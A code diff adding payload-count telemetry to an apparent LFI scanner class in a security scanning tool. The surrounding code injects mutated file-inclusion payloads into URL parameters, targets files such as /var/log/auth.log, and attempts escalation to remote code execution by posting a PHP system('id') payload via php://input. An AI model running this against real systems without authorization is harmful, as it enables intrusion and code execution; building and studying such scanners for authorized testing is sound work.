@@ -9,6 +9,14 @@ from core.models import db, Finding
 from core.results_store import load_results
 
 class LfiAssaultScanner:
+    PAYLOAD_TELEMETRY_KEYS = (
+        "payloads_planned",
+        "payloads_attempted",
+        "payloads_skipped",
+        "payloads_succeeded",
+        "payloads_errored",
+    )
+
     """
     Phase 4: Matrix-Based LFI Assault.
     Replaces the basic lfi_scanner.py with a full mutation-based engine.
@@ -43,6 +51,18 @@ class LfiAssaultScanner:
             "/var/log/auth.log",
             "php://input"
         ]
+        self.last_telemetry = self._new_payload_telemetry()
+
+    @classmethod
+    def _new_payload_telemetry(cls):
+        return {key: 0 for key in cls.PAYLOAD_TELEMETRY_KEYS}
+
+    @classmethod
+    def _merge_payload_telemetry(cls, base, overlay):
+        merged = cls._new_payload_telemetry()
+        for key in cls.PAYLOAD_TELEMETRY_KEYS:
+            merged[key] = int((base or {}).get(key, 0) or 0) + int((overlay or {}).get(key, 0) or 0)
+        return merged
 
     def scan(self, target, scan_id, urls=None, logger=None, finding_callback=None, quick=False):
         """
@@ -69,6 +89,7 @@ class LfiAssaultScanner:
             
         # 2. Attack Execution
         findings = []
+        aggregate_telemetry = self._new_payload_telemetry()
         
         # We process URLs in parallel threads
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
@@ -76,7 +97,8 @@ class LfiAssaultScanner:
             for future in concurrent.futures.as_completed(future_to_url):
                 url = future_to_url[future]
                 try:
-                    url_findings = future.result()
+                    url_findings, url_telemetry = future.result()
+                    aggregate_telemetry = self._merge_payload_telemetry(aggregate_telemetry, url_telemetry)
                     if url_findings:
                         for f in url_findings:
                             if finding_callback:
@@ -91,6 +113,12 @@ class LfiAssaultScanner:
                 except Exception as e:
                     if logger: logger(f"LFI Error on {url}: {e}", "ERROR")
 
+        self.last_telemetry = aggregate_telemetry
+        if logger:
+            logger(
+                f"LFI Assault telemetry: {json.dumps(aggregate_telemetry, sort_keys=True)}",
+                "DEBUG",
+            )
         if logger: logger(f"LFI Assault: Finished. Found {len(findings)} issues.", "SUCCESS")
         return findings
 
@@ -100,6 +128,7 @@ class LfiAssaultScanner:
         Performs the matrix attack on a single base URL.
         """
         findings = []
+        telemetry = self._new_payload_telemetry()
         target_urls_with_points = []
         
         # 1. Existing params
@@ -138,57 +167,84 @@ class LfiAssaultScanner:
                  except: baselines[target_url] = ""
 
         # Phase 1: Matrix Rules
+        matrix_attempts = []
         for rule in self.lfi_rules:
             # In quick mode, only test first 3 payloads per rule
             payloads_to_test = rule.get("payloads", [])
-            if quick: payloads_to_test = payloads_to_test[:3]
-                
+            if quick:
+                payloads_to_test = payloads_to_test[:3]
+
             for base_payload in payloads_to_test:
                 # Apply mutations
                 rule_mutations = rule.get("mutations")
                 if quick:
                     rule_mutations = [m for m in rule_mutations if m in ["url_encode", "original"]]
-                    if not rule_mutations: rule_mutations = ["original"]
+                    if not rule_mutations:
+                        rule_mutations = ["original"]
 
                 mutations = PayloadMutator.mutate(base_payload, rule_mutations)
-                
+
                 for payload in mutations:
                     for target_url, param in target_urls_with_points:
-                        final_url = self._inject(target_url, param, payload)
-                        try:
-                            resp = session.get(final_url, timeout=3, verify=False)
-                            baseline_text = baselines.get(target_url, "")
-                            
-                            # CRITICAL: Verify success AND check that it's NOT in the baseline
-                            if self._check_success(resp, rule, baseline_text=baseline_text):
-                                from scan_engine.helpers.finding_normalizer import FindingNormalizer
-                                findings.append(FindingNormalizer.from_response(
-                                    resp,
-                                    title=f"Local File Inclusion (LFI) - {rule['rule_id']}",
-                                    severity="critical",
-                                    confidence="high",
-                                    description=f"Confirmed Local File Inclusion via differential analysis.\nURL: {final_url}\nPayload: {payload}\nConfirmed using rule: {rule['rule_id']}",
-                                    tool_source="lfi_assault",
-                                    category="lfi",
-                                    payload=payload,
-                                    method="GET",
-                                    metadata={
-                                        "rule_id": rule['rule_id'],
-                                        "bypass_technique": "mutation_matrix"
-                                    }
-                                ))
-                                break 
-                        except Exception:
-                            pass
-                    if findings: break
-                if findings: break
+                        matrix_attempts.append(
+                            {
+                                "rule": rule,
+                                "target_url": target_url,
+                                "param": param,
+                                "payload": payload,
+                                "final_url": self._inject(target_url, param, payload),
+                            }
+                        )
+
+        telemetry["payloads_planned"] += len(matrix_attempts)
+        for index, attempt in enumerate(matrix_attempts):
+            telemetry["payloads_attempted"] += 1
+            try:
+                resp = session.get(attempt["final_url"], timeout=3, verify=False)
+                baseline_text = baselines.get(attempt["target_url"], "")
+
+                # CRITICAL: Verify success AND check that it's NOT in the baseline
+                if self._check_success(resp, attempt["rule"], baseline_text=baseline_text):
+                    from scan_engine.helpers.finding_normalizer import FindingNormalizer
+                    telemetry["payloads_succeeded"] += 1
+                    findings.append(FindingNormalizer.from_response(
+                        resp,
+                        title=f"Local File Inclusion (LFI) - {attempt['rule']['rule_id']}",
+                        severity="critical",
+                        confidence="high",
+                        description=(
+                            "Confirmed Local File Inclusion via differential analysis.\n"
+                            f"URL: {attempt['final_url']}\n"
+                            f"Payload: {attempt['payload']}\n"
+                            f"Confirmed using rule: {attempt['rule']['rule_id']}"
+                        ),
+                        tool_source="lfi_assault",
+                        category="lfi",
+                        payload=attempt["payload"],
+                        method="GET",
+                        metadata={
+                            "rule_id": attempt["rule"]["rule_id"],
+                            "bypass_technique": "mutation_matrix"
+                        }
+                    ))
+                    telemetry["payloads_skipped"] += len(matrix_attempts) - index - 1
+                    break
+            except Exception:
+                telemetry["payloads_errored"] += 1
+                pass
 
         # Phase 2: RCE Bridge Escalation (V12 Ultimate - Log Poisoning & php://input)
         if findings or not quick:
-            for target_url, param in target_urls_with_points[:5]:
+            bridge_targets = target_urls_with_points[:5]
+            for target_url, param in bridge_targets:
+                for bridge_payload in self.rce_bridge_payloads:
+                    telemetry["payloads_planned"] += 2 if "php://input" in bridge_payload else 1
+
+            for target_url, param in bridge_targets:
                 for bridge_payload in self.rce_bridge_payloads:
                     final_url = self._inject(target_url, param, bridge_payload)
                     try:
+                        telemetry["payloads_attempted"] += 1
                         resp = session.get(final_url, timeout=3, verify=False)
                         
                         # 1. Check if we can read logs or trigger wrapper
@@ -204,12 +260,14 @@ class LfiAssaultScanner:
                         
                         if is_php_input:
                             # Attempt RCE verification via POST
+                            telemetry["payloads_attempted"] += 1
                             r_rce = session.post(final_url, data="<?php system('id'); ?>", timeout=5, verify=False)
                             if "uid=" in r_rce.text:
                                 success = True
                                 escalation_type = "RCE via php://input"
                         
                         if success:
+                            telemetry["payloads_succeeded"] += 1
                             from scan_engine.helpers.finding_normalizer import FindingNormalizer
                             findings.append(FindingNormalizer.from_response(
                                 r_rce if is_php_input else resp,
@@ -222,9 +280,11 @@ class LfiAssaultScanner:
                                 payload=bridge_payload,
                                 method="POST" if is_php_input else "GET"
                             ))
-                    except: pass
+                    except:
+                        telemetry["payloads_errored"] += 1
+                        pass
                             
-        return findings
+        return findings, telemetry
 
     def _inject(self, url, param, payload):
         parsed = urlparse(url)
